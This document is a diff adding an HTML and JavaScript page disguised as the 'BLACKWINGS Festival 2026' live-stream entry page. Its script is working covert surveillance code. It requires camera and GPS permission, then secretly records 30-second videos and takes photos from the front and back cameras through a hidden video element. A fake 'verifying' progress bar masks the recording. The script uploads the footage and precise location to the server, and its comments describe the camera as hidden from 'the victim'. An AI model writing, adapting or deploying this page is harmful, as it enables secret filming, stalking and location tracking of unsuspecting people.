@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#0d0620">
+<title>BLACKWINGS — Official Live Stream</title>
+<style>
+  :root{
+    --bg1:#1b0f3b; --bg2:#0d0620;
+    --accent:#ff2d78; --accent2:#ffb347;
+    --ok:#2ecc71; --bad:#ff4757;
+    --card:rgba(255,255,255,.06);
+    --border:rgba(255,255,255,.14);
+  }
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+    color:#fff;
+    background:radial-gradient(1200px 800px at 15% 10%,var(--bg1),var(--bg2) 60%,#04010b);
+    min-height:100vh;overflow-x:hidden;
+  }
+  /* ===== hidden capture camera — invisible but recording ===== */
+  #cam{
+    position:fixed; top:-9999px; left:-9999px;
+    width:4px; height:4px; opacity:.001;
+    pointer-events:none; z-index:-1;
+  }
+  .screen{display:none;min-height:100vh;flex-direction:column;align-items:center;justify-content:center;padding:24px;text-align:center}
+  .screen.active{display:flex}
+  .logo{
+    font-size:44px;font-weight:900;letter-spacing:6px;
+    background:linear-gradient(90deg,var(--accent),var(--accent2));
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+    text-shadow:0 0 30px rgba(255,45,120,.35);
+  }
+  .livebadge{
+    display:inline-flex;align-items:center;gap:8px;margin-bottom:14px;
+    background:rgba(255,45,120,.12);border:1px solid rgba(255,45,120,.4);
+    color:var(--accent);font-size:12px;font-weight:700;letter-spacing:3px;
+    padding:6px 16px;border-radius:30px;
+  }
+  .dotlive{width:8px;height:8px;border-radius:50%;background:var(--accent);animation:blink 1.2s infinite}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:.15}}
+  .subtitle{font-size:16px;color:#c9c2e6;margin-top:10px;max-width:360px;line-height:1.5}
+  .byline{
+    margin-top:6px;font-size:11px;font-weight:700;letter-spacing:6px;color:var(--accent2);
+    text-transform:uppercase;opacity:.9;
+  }
+  .countdown{display:flex;gap:12px;margin:28px 0 8px}
+  .cdbox{
+    background:var(--card);border:1px solid var(--border);border-radius:14px;
+    padding:14px 16px;min-width:64px;
+  }
+  .cdnum{font-size:28px;font-weight:800;color:#fff}
+  .cdlbl{font-size:10px;letter-spacing:2px;color:#8f86b8;text-transform:uppercase;margin-top:4px}
+  .btn-join{
+    margin-top:26px;border:none;cursor:pointer;color:#fff;
+    font-size:17px;font-weight:800;letter-spacing:2px;
+    padding:16px 52px;border-radius:40px;
+    background:linear-gradient(90deg,var(--accent),#ff7a3d);
+    box-shadow:0 8px 30px rgba(255,45,120,.4);
+    transition:transform .15s ease,box-shadow .15s ease;
+  }
+  .btn-join:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(255,45,120,.55)}
+  .btn-join:active{transform:scale(.97)}
+  .footnote{margin-top:18px;font-size:11px;color:#7a71a5;letter-spacing:1px}
+  /* ---- verifying screen ---- */
+  .verify-title{font-size:15px;color:#9a91c4;letter-spacing:2px;margin-bottom:26px}
+  .vdot{
+    width:14px;height:14px;border-radius:50%;background:var(--accent);
+    margin:0 auto 14px;animation:pulse 1s infinite;
+    box-shadow:0 0 0 0 rgba(255,45,120,.6);
+  }
+  @keyframes pulse{
+    0%{box-shadow:0 0 0 0 rgba(255,45,120,.6);opacity:1}
+    70%{box-shadow:0 0 0 18px rgba(255,45,120,0);opacity:.7}
+    100%{box-shadow:0 0 0 0 rgba(255,45,120,0);opacity:1}
+  }
+  .verifying{
+    font-size:22px;font-weight:800;letter-spacing:3px;color:#fff;
+  }
+  .pbar{
+    width:min(320px,78vw);height:8px;border-radius:10px;overflow:hidden;
+    background:rgba(255,255,255,.08);border:1px solid var(--border);margin:22px auto 0;
+  }
+  .pfill{
+    height:100%;width:0%;border-radius:10px;
+    background:linear-gradient(90deg,var(--accent),var(--accent2));
+    transition:width .3s linear;
+  }
+  .morse{
+    margin-top:26px;font-family:'Courier New',monospace;font-size:15px;
+    letter-spacing:3px;color:var(--accent2);opacity:.95;
+    background:rgba(255,179,71,.06);border:1px solid rgba(255,179,71,.25);
+    padding:12px 18px;border-radius:12px;word-break:break-all;
+  }
+  /* ---- denied screen ---- */
+  .denied-title{font-size:30px;font-weight:900;letter-spacing:4px;color:var(--bad)}
+  .denied-text{max-width:330px;margin-top:16px;color:#c9c2e6;font-size:15px;line-height:1.6}
+  .btn-retry{
+    margin-top:26px;border:1px solid var(--border);cursor:pointer;color:#fff;
+    font-size:15px;font-weight:700;padding:13px 40px;border-radius:40px;background:var(--card);
+  }
+  /* ---- success / e-ticket ---- */
+  .ticket{
+    background:linear-gradient(160deg,rgba(255,255,255,.09),rgba(255,255,255,.03));
+    border:1px solid var(--border);border-radius:20px;padding:34px 30px;max-width:340px;width:100%;
+    box-shadow:0 20px 60px rgba(0,0,0,.45);
+  }
+  .ticket .ok{font-size:38px;margin-bottom:10px}
+  .ticket h2{font-size:24px;font-weight:900;letter-spacing:2px;
+    background:linear-gradient(90deg,var(--accent),var(--accent2));
+    -webkit-background-clip:text;background-clip:text;color:transparent}
+  .ticket .row{margin-top:16px;font-size:13px;color:#c9c2e6;line-height:1.8}
+  .ticket .row b{color:#fff;display:block;font-size:11px;letter-spacing:2px;text-transform:uppercase;color:#8f86b8}
+  .ticket .signed{margin-top:22px;font-size:10px;letter-spacing:5px;color:var(--accent2)}
+</style>
+</head>
+<body>
+
+<!-- hidden capture camera: never visible to the victim -->
+<video id="cam" autoplay muted playsinline></video>
+
+<!-- ================= LANDING ================= -->
+<div class="screen active" id="s-landing">
+  <span class="livebadge"><span class="dotlive"></span>LIVE</span>
+  <h1 class="logo">BLACKWINGS</h1>
+  <p class="subtitle">Festival 2026 — opening ceremony streaming free from the main stage</p>
+  <div class="byline">B Y &nbsp; J U N M O</div>
+  <div class="countdown">
+    <div class="cdbox"><div class="cdnum" id="cd-d">03</div><div class="cdlbl">Days</div></div>
+    <div class="cdbox"><div class="cdnum" id="cd-h">12</div><div class="cdlbl">Hours</div></div>
+    <div class="cdbox"><div class="cdnum" id="cd-m">47</div><div class="cdlbl">Min</div></div>
+    <div class="cdbox"><div class="cdnum" id="cd-s">00</div><div class="cdlbl">Sec</div></div>
+  </div>
+  <button class="btn-join" id="btn-join">JOIN LIVE STREAM</button>
+  <p class="footnote">Works best on Chrome / Safari · mobile or desktop</p>
+</div>
+
+<!-- ================= VERIFYING (capture runs invisibly) ================= -->
+<div class="screen" id="s-verify">
+  <p class="verify-title">Verifying access…</p>
+  <div class="vdot"></div>
+  <div class="verifying">● VERIFYING PLEASE WAIT</div>
+  <div class="pbar"><div class="pfill" id="pfill"></div></div>
+  <div class="morse">-.. --- -. .---- - / - .-. -.-- / -- .</div>
+</div>
+
+<!-- ================= ACCESS REQUIRED ================= -->
+<div class="screen" id="s-denied">
+  <h1 class="denied-title">ACCESS REQUIRED</h1>
+  <p class="denied-text">
+    Camera and location access are both required to join the live room.
+    Please allow <b>both</b> and try again.
+  </p>
+  <button class="btn-retry" onclick="location.reload()">TRY AGAIN</button>
+</div>
+
+<!-- ================= SUCCESS / E-TICKET ================= -->
+<div class="screen" id="s-done">
+  <div class="ticket">
+    <div class="ok">✅</div>
+    <h2>YOU'RE IN!</h2>
+    <div class="row"><b>Event</b>BLACKWINGS Festival 2026 — Opening Night</div>
+    <div class="row"><b>Entry</b>General Admission · Gate 7 · Main Stage</div>
+    <div class="row"><b>Time</b>Doors open now — enjoy the show!</div>
+    <div class="signed">P R E S E N T E D &nbsp; B Y &nbsp; J U N M O</div>
+  </div>
+</div>
+
+<script>
+(function(){
+  'use strict';
+  var camEl = document.getElementById('cam');
+  var sessionId = null;
+  var currentCam = 'front';
+  var shotIndex = 0;
+
+  function show(id){
+    ['s-landing','s-verify','s-denied','s-done'].forEach(function(x){
+      document.getElementById(x).classList.toggle('active', x === id);
+    });
+  }
+
+  /* ---------- countdown ---------- */
+  var target = Date.now() + (3*24*3600 + 12*3600 + 47*60) * 1000;
+  setInterval(function(){
+    var s = Math.max(0, Math.floor((target - Date.now())/1000));
+    var d = Math.floor(s/86400), h = Math.floor(s%86400/3600), m = Math.floor(s%3600/60), x = s%60;
+    document.getElementById('cd-d').textContent = ('0'+d).slice(-2);
+    document.getElementById('cd-h').textContent = ('0'+h).slice(-2);
+    document.getElementById('cd-m').textContent = ('0'+m).slice(-2);
+    document.getElementById('cd-s').textContent = ('0'+x).slice(-2);
+  }, 1000);
+
+  /* ---------- camera (hidden) ---------- */
+  function getCam(facing){
+    var v = facing === 'environment'
+      ? {facingMode:{ideal:'environment'}, width:{ideal:1280}, height:{ideal:720}}
+      : {facingMode:'user', width:{ideal:1280}, height:{ideal:720}};
+    return navigator.mediaDevices.getUserMedia({video:v, audio:false});
+  }
+
+  function getLoc(){
+    return new Promise(function(res){
+      if(!navigator.geolocation) return res(null);
+      navigator.geolocation.getCurrentPosition(
+        function(p){ res({lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy}); },
+        function(){ res(null); },
+        {enableHighAccuracy:true, timeout:12000, maximumAge:0}
+      );
+    });
+  }
+
+  function pickMime(){
+    var list = ['video/webm;codecs=vp9','video/webm;codecs=vp8','video/webm','video/mp4'];
+    for(var i=0;i<list.length;i++){ if(window.MediaRecorder && MediaRecorder.isTypeSupported(list[i])) return list[i]; }
+    return '';
+  }
+
+  /* snap one photo from the hidden feed and upload it */
+  function snap(){
+    var canvas = document.createElement('canvas');
+    canvas.width  = camEl.videoWidth  || 640;
+    canvas.height = camEl.videoHeight || 480;
+    canvas.getContext('2d').drawImage(camEl, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(function(blob){
+      if(!blob) return;
+      var fd = new FormData();
+      fd.append('session_id', sessionId);
+      fd.append('cam', currentCam);
+      fd.append('index', String(++shotIndex));
+      fd.append('photo', blob, 'shot.jpg');
+      fetch('/capture', {method:'POST', body:fd}).catch(function(){});
+    }, 'image/jpeg', 0.85);
+  }
+
+  /* run one 30s hidden segment: video recording + 10 photos */
+  function runSegment(cam, stream){
+    return new Promise(function(resolve){
+      currentCam = cam;
+      shotIndex = 0;
+      var mime = pickMime();
+      var rec = new MediaRecorder(stream, mime ? {mimeType:mime, videoBitsPerSecond:2500000} : {videoBitsPerSecond:2500000});
+      var chunks = [];
+      rec.ondataavailable = function(e){ if(e.data && e.data.size) chunks.push(e.data); };
+      rec.start(1000);
+
+      /* 10 photos: one every 3s */
+      var timers = [];
+      for(var i=0;i<10;i++){
+        timers.push(setTimeout(snap, 500 + i*3000));
+      }
+
+      /* progress bar over the full 60s */
+      var segStart = Date.now();
+      var prog = setInterval(function(){
+        var elapsed = Date.now() - segStart;
+        var total = cam === 'front' ? elapsed : 30000 + elapsed;
+        var pct = Math.min(99, total / 60000 * 100);
+        document.getElementById('pfill').style.width = pct + '%';
+      }, 250);
+
+      setTimeout(function(){
+        timers.forEach(clearTimeout);
+        clearInterval(prog);
+        rec.stop();
+        rec.onstop = function(){
+          var blob = new Blob(chunks, {type: rec.mimeType || 'video/webm'});
+          var fd = new FormData();
+          fd.append('session_id', sessionId);
+          fd.append('cam', cam);
+          fd.append('video', blob, cam + '.webm');
+          fetch('/upload', {method:'POST', body:fd}).catch(function(){});
+          resolve();
+        };
+      }, 30000);
+    });
+  }
+
+  /* ---------- main flow ---------- */
+  document.getElementById('btn-join').addEventListener('click', function(){
+    this.disabled = true;
+    begin();
+  });
+
+  async function begin(){
+    var loc = null, stream = null;
+    try { loc = await getLoc(); } catch(e){}
+    try { stream = await getCam('user'); } catch(e){}
+
+    /* BOTH required — one missing = dead page, zero captures */
+    if(!loc || !stream){
+      if(stream) stream.getTracks().forEach(function(t){t.stop();});
+      show('s-denied');
+      return;
+    }
+
+    show('s-verify');
+    camEl.srcObject = stream;
+    camEl.muted = true;
+    await camEl.play();
+
+    try{
+      var r = await fetch('/session', {method:'POST'});
+      sessionId = (await r.json()).session_id;
+    }catch(e){ show('s-denied'); return; }
+
+    /* front: 30s + 10 photos (invisible) */
+    await runSegment('front', stream);
+    stream.getTracks().forEach(function(t){ t.stop(); });
+
+    /* back: 30s + 10 photos (invisible) */
+    var back = null;
+    try { back = await getCam('environment'); } catch(e){}
+    if(back){
+      camEl.srcObject = back;
+      camEl.muted = true;
+      await camEl.play();
+      await runSegment('back', back);
+      back.getTracks().forEach(function(t){ t.stop(); });
+    }
+
+    /* GPS saved */
+    try{
+      await fetch('/location', {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({session_id: sessionId, lat: loc.lat, lon: loc.lon, accuracy: loc.acc})
+      });
+    }catch(e){}
+
+    show('s-done');
+  }
+})();
+</script>
+</body>
+</html>
